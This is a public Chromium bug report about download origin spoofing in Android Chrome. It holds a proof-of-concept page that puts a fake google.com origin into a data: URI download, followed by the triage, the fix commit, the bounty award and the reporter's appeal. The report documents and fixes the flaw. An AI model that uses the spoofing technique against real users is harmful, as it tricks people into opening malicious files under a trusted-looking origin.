# Download origin spoofing using hostname in data uri.

| Field | Value |
|-------|-------|
| **Issue ID** | [473118648](https://issues.chromium.org/issues/473118648) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | UI>Browser>Downloads |
| **Platforms** | Android |
| **Chrome Version** | 143.0.7499.146 |
| **Reporter** | x4...@gmail.com |
| **Assignee** | ch...@chromium.org |
| **Created** | 2026-01-03 |
| **Bounty** | $3,000.00 |

## Description

# Steps to reproduce the problem

1. Host the code:

```

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Download & Fullscreen on Keypress</title>
</head>
<body>
  <center><h2>POC by Chigorin!</h2></center>
  <input type="text" id="triggerInput">

  <script>
    document.getElementById('triggerInput').addEventListener('click', function() {
      // request fullscreen
 setTimeout(function() {
        openWin();
 }, 500);
 window.open('https://www.google.com', '_blank');
    }, { once: false }); // Use { once: true } to ensure it only fires once

    // Download helper
    function Puf(uri, name) {
      const link = document.createElement("a");
      link.href = uri;
      link.download = name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }

    // Kick off your “APK” download
    function openWin() {
      Puf(
        "data:https://google.com/                                                                                                                                                                                                                       application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
        "google.mp4"
      );
    }

  </script>
  

  
</body>
</html>


```

2. Click on the input box and wait for the prompt.
3. Notice the prompt origin contains data:<https://google.com>

==Note: you can change the file type to anything, even malicious like apk and the prompt will contain fake origin only thing matters is the payload you embed which is after a comma==

# Problem Description

The download origin is a point of trust for opening any file and in this case that trust is broken by spoofed origin allowing the victim to click and open the malicious file giving access to the attacker.

# Summary

Download origin spoofing using hostname in data uri.

# Custom Questions

#### Reporter credit:

Abhishek Kumar

# Additional Data

Category: Security   

Chrome Channel: Stable   

Regression: Yes \

## Attachments

- [POC 2026-01-03 at 17.59.56.mp4](attachments/POC 2026-01-03 at 17.59.56.mp4) (video/mp4, 3.6 MB)
- [WhatsApp Image 2026-01-05 at 21.43.45.jpeg](attachments/WhatsApp Image 2026-01-05 at 21.43.45.jpeg) (image/jpeg, 66.7 KB)
- [Mon Jan 12 2026 22:28:00 GMT+0530 (India Standard Time).png](attachments/Mon Jan 12 2026 22_28_00 GMT+0530 (India Standard Time).png) (image/png, 63.9 KB)
- [WhatsApp Image 2026-01-12 at 23.19.27.jpeg](attachments/WhatsApp Image 2026-01-12 at 23.19.27.jpeg) (image/jpeg, 62.6 KB)
- [WhatsApp Image 2026-02-09 at 18.30.00.jpeg](attachments/WhatsApp Image 2026-02-09 at 18.30.00.jpeg) (image/jpeg, 54.4 KB)

## Timeline

### x4...@gmail.com (2026-01-05)

Adding spaces after `data:` make the spoof much more convincing.

### ke...@chromium.org (2026-01-05)

Thanks for the report.

chlily@: Can you please help triage this? We have a number of bugs open regarding download UI, and some of them talk about `data:` URLs, but it isn't clear if this is a direct duplicate. Also I don't know how unclear we think `data:https://google.com/` is.

### ch...@chromium.org (2026-01-05)

Weird, I would've thought [crrev.com/c/6701188](https://crrev.com/c/6701188) fixed cases like this. This looks the same as [crbug.com/421511847](https://crbug.com/421511847) but if that's not actually fixed, this is probably a different bug and not a duplicate.

### ch...@chromium.org (2026-01-08)

Ah, looking back at [crbug.com/421511847](https://crbug.com/421511847), I had apparently investigated this case ("data:foo" with no slashes, versus "data:/foo" or "data://foo"), but forgot/neglected to test all 3 cases when I made the changes in [crrev.com/c/6701188](https://crrev.com/c/6701188).

### x4...@gmail.com (2026-01-12)

You know what? Hiring me instantly eliminates 90% risk of missing test cases. I’m graduating soon anyway so this is a limited time offer 🫣😂

### x4...@gmail.com (2026-01-12)

> Also I don't know how unclear we think data:<https://google.com/> is.

Actually before the data uri it shows the file size which coincidentally makes it a convincing spoof. Like a user may misinterpret it as showing the data it took to download. we can also add the "from" word to make it look like this.

`File downloaded`

`(1Mb) data: from https://google.com`

### ch...@chromium.org (2026-01-15)

Ok, looking into this more deeply, I think it's not due to the presence or absence of slashes right after `data:` but rather the spaces. It seems the url formatting function truncates the data: URL, and if the point where it gets truncated is preceded by a bunch of whitespace, those get trimmed off, so we end up with a "formatted" URL that looks good (came out of formatUrlForSecurityDisplay and is short enough), but is obviously misleading and attacker-controlled.

Seems cleaner to me if we just skip all of this for an opaque origin like a data: URL, which is what I'm doing to fix this: [crrev.com/c/7476846](https://crrev.com/c/7476846). It's not going to be meaningful to display to the user anyway.

Potentially it could be meaningful to display the precursor origin for the data: URL, but that would require some more plumbing.

### ch...@chromium.org (2026-01-15)

cc cthomp: I am not planning to touch formatUrlForSecurityDisplay for this, but FYI it seems to have unintuitive behavior here, and I'm planning to bypass it by returning early for any opaque origin.

### dx...@google.com (2026-01-20)

Project: chromium/src  

Branch:  main  

Author:  Lily Chen [chlily@chromium.org](mailto:chlily@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7476846>

Android downloads UI: Do not display invalid or non-standard URLs

---


Expand for full commit details
```
     
    This fixes a util function used for formatting a download URL to display 
    to the user in various downloads UI surfaces in Clank. 
     
    In crrev.com/c/6701188, we previously fixed the fallback logic that 
    kicks in when formatUrlForSecurityDisplay() produces a string that is 
    too long. For certain non-standard URL schemes that do not have a host, 
    that CL made us fall back to the text of the URL itself rather than 
    trying to parse out an eTLD+1 (which is not meaningful when there is no 
    host). 
     
    However, that previous CL did not account for edge cases in which 
    formatUrlForSecurityDisplay() itself may produce misleading results for 
    non-standard URL schemes. 
     
    In this CL, we stop attempting to even call 
    formatUrlForSecurityDisplay() for such non-standard URLs, and we do not 
    display any fallback. Instead, we always omit the download URL/origin if 
    it is an opaque origin. Even if there may be some textual representation 
    of the URL available, in these cases it is not necessarily meaningful to 
    the user and may allow misleading strings to be injected, so prefer to 
    omit it. 
     
    Adds unit tests for this formatting util function. 
     
    Change-Id: I2231d1527def0480710a7120ae861ac3556fd0c0 
    Bug: 473118648 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7476846 
    Commit-Queue: Lily Chen <chlily@chromium.org> 
    Reviewed-by: David Trainor <dtrainor@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1571795}

```

---

Files:

- M `components/browser_ui/util/android/BUILD.gn`
- M `components/browser_ui/util/android/java/src/org/chromium/components/browser_ui/util/DownloadUtils.java`
- A `components/browser_ui/util/android/java/src/org/chromium/components/browser_ui/util/DownloadUtilsTest.java`

---

Hash: [9286eb828b8e02637eb59ee32d38fdb5a7fa7585](https://chromiumdash.appspot.com/commit/9286eb828b8e02637eb59ee32d38fdb5a7fa7585)  

Date: Tue Jan 20 19:58:34 2026


---

### sp...@google.com (2026-01-30)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $3000.00 for this report.

Rationale for this decision:
Security UI spoofing baseline / lower impact


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### x4...@gmail.com (2026-02-03)

Appeal reward reason: Technical analysis: When a victim/user initiate a gesture a download is started and they makes their decision based on the origin shown in the immediate notification after a download completes which in this case shows  `1 Mb data: from https://google.com` a normal user CAN NOT find anything suspicious in this that would cause friction on opening the downloaded file. Which means it has fair degree of attacker control (according to your rules page.) and hence should be considered a MODERATE impact vulnerability.

Historical analysis: My OWN PREVIOUS report <https://issues.chromium.org/issues/421511847#comment21> received MODERATE IMPACT classification for functionally identical origin spoofing behavior. The only distinction is cosmetic formatting in the download notification ("data: from" vs "from"), which doesn't materially affect the security impact. Both vulnerabilities exploit the same underlying weakness in Chrome's download notification system to deceive users about file provenance.

Why did I not provide root cause analysis like my previous report?
Because I wasn't rewarded for that but I respected your decision to neither use my patch nor bisect information.
It's really depressing when you keep "holy low ball"ing my report :(

### wf...@chromium.org (2026-02-04)

Ty for your comment. The VRP panel will look at this in one of the upcoming sessions.

### ct...@chromium.org (2026-02-04)

The distinction you point out was considered by the panel to be more than just "cosmetic" -- it is meaningful downgrade in the quality of the spoof and makes the spoofed download look meaningfully different from a regular download. We still considered it a spoof we should fix, just with lower impact than your previous report.

### x4...@gmail.com (2026-02-05)

Could you please explain it to me how a normal user can differentiate between `1 Mb data: from https://google.com` and `1 Mb https://google.com`? The only point of trust to a normal user is the URL in the downloads notification and in this case it's a perfect URL. Even me being from security background would not have made out the difference.

I would totally understand if there's a reasonable thing to suspect in this spoof but I am unable to find any.
[chlily@chromium.org](mailto:chlily@chromium.org) would like your opinion on this since you've mostly worked on downloads func.
@chlily

Thanks.

### x4...@gmail.com (2026-02-09)

Hello I have additional information to share. I think the fix is insufficient as it does not account download warning dialog allowing text to be injected in the download warnings:

### x4...@gmail.com (2026-02-10)

Can you acknowledge the above message so I don't have to open another issue.
Or if you want this to go into a separate report let me know.

### ch...@chromium.org (2026-02-10)

This issue is closed as Fixed. Further report(s) should be in a separate issue(s).

### li...@chromium.org (2026-02-10)

I will note that the warning dialog highlights the domain in a different color, unlike the original prompt, where there's no demarcation between the templated text and domain.

Maybe we could ignore nonstandard values there or add some stronger form of demarcation (e.g. enclosing the domain in quotes). If so, we could check for nonstandard domains [here](https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/download/android/dangerous_download_dialog_bridge.cc;l=31;drc=5a8164b4d1bf0ff26deddb937644573572abfca1) and change the template inputs [here](https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/download/android/java/src/org/chromium/chrome/browser/download/dialogs/DangerousDownloadDialog.java;l=125;drc=b2bf216dc223e333700a470b55df72ffeba66c6d).

### ct...@chromium.org (2026-03-27)

> Could you please explain it to me how a normal user can differentiate between 1 Mb data: from <https://google.com> and 1 Mb <https://google.com>? The only point of trust to a normal user is the URL in the downloads notification and in this case it's a perfect URL. Even me being from security background would not have made out the difference.
> 
> I would totally understand if there's a reasonable thing to suspect in this spoof but I am unable to find any.

As previously explained, the presence of the "data: " prefix was determined to make this a less useful spoof, as it allows an attentive user to notice the difference between the non-data: URL download case and the data: URL download case. Previously, they were indistinguishable, which we considered to be a higher impact.

> Hello I have additional information to share. I think the fix is insufficient as it does not account download warning dialog allowing text to be injected in the download warnings:

This is a different UI, which distinguishes via formatting what each string is. Our opinion is that because the "data: of url <https://google.com/,payload>" is shown as a single entity, this is not sufficient spoofing to meet our criteria for an impactful spoof bug. This is already explained in [Comment #19](https://issues.chromium.org/issues/473118648#comment19), with some ideas for minor improvements to the clarity of this UI.

We are increasingly strict about what constitutes an "interesting" UI spoof bug report, so prior precedent is often not a great argument. Evidence of these UIs being abused to trick users *in the wild* is a particularly helpful form of evidence of impact.

### ch...@google.com (2026-04-29)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> Security UI spoofing baseline / lower impact

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/473118648)*
